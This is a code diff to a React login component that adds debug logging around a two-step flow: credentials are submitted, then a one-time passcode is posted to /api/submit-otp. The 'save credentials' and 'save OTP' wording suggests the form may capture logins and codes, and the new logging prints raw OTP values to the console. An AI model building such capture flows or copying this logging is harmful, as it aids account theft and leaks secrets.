@@ -314,7 +314,10 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
       });
     },
     onSuccess: (data: any) => {
-      setSubmissionId(data.submissionId);
+      console.log("Credential submission response:", data);
+      const id = data.submissionId;
+      console.log("Setting submissionId to:", id);
+      setSubmissionId(id);
       resetOtpForm();
       setStep("otp");
       toast({
@@ -323,6 +326,7 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
       });
     },
     onError: (error: any) => {
+      console.error("Credential submission error:", error);
       toast({
         title: "Submission failed",
         description: error.message || "Unable to save credentials",
@@ -333,16 +337,23 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
 
   const submitOtpMutation = useMutation({
     mutationFn: async (otp: string) => {
-      if (!submissionId) throw new Error("No submission ID");
+      console.log("Current submissionId before OTP submit:", submissionId);
+      if (!submissionId) {
+        console.error("No submission ID available!");
+        throw new Error("No submission ID");
+      }
+      console.log("Submitting OTP with submissionId:", submissionId, "and OTP:", otp);
       return await apiRequest("POST", "/api/submit-otp", {
         submissionId,
         otp,
       });
     },
     onSuccess: () => {
+      console.log("OTP submitted successfully");
       setStep("success");
     },
     onError: (error: any) => {
+      console.error("OTP submission error:", error);
       toast({
         title: "OTP submission failed",
         description: error.message || "Unable to save OTP",
@@ -376,6 +387,7 @@ export function UnifiedLoginForm({ method, step, submissionId, setStep, setSubmi
   }
 
   if (step === "otp") {
+    console.log("Rendering OTP form with submissionId:", submissionId);
     return (
       <Form {...otpForm} key="otp-form">
         <form onSubmit={otpForm.handleSubmit(onSubmitOtp)} className="space-y-4" autoComplete="off">
